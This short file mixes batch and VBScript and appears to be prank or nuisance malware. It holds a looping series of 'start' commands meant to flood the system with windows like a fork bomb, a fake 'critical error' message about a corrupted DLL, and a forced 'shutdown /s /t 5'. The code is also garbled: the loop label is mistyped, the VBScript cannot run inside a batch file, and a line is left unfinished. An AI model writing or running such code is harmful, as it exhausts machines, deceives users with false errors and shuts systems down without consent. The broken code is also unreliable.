@echo off
:loop
start
start 
start
start
start
start
start
start
start
start
start
gotoloop
Set objShell = CreateObject("WScript.Shell")
MsgBox "A critical error has occurred." & vbCrLf & vbCrLf & _
       "The system cannot locate file abc123.dll due to corruption." & vbCrLf & _
shutdown /s /t 5
